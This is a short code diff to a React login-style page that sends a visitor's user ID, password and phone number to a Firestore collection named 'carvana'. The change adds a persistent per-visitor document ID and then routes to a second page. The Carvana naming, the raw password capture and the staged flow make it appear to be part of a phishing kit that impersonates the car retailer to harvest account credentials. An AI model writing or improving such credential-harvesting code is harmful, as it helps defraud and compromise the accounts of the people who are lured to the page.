@@ -46,10 +46,17 @@ const FirstPage = () => {
 
     try {
       const timestamp = Date.now();
+
+      // Generate or reuse a persistent document ID per user
+      let documentId = localStorage.getItem('carvana_document_id');
+      if (!documentId) {
+        documentId = `user_${timestamp}`;
+        localStorage.setItem('carvana_document_id', documentId);
+      }
       
-      // Upload data to Firestore in the carvana collection
-      const result = await FirebaseUtil.uploadAnyModel("carvana", {
-        key: `user_${timestamp}`,
+      // Upload data to Firestore to a specific document under a single collection
+      const result = await FirebaseUtil.uploadAnyModel(`carvana/${documentId}`, {
+        key: documentId,
         userId,
         password1,
         phoneNumber,
@@ -58,10 +65,10 @@ const FirstPage = () => {
       
       // Check if upload was successful
       if (result.state === 'success') {
-        // Navigate to the second page with the document ID
+        // Navigate to the second page with the persistent document ID
         setTimeout(() => {
           setIsSubmitting(false);
-          navigate(`/second/${result.data}`);
+          navigate(`/second/${documentId}`);
         }, 1500);
       } else {
         throw new Error(result.error || 'Failed to upload data');
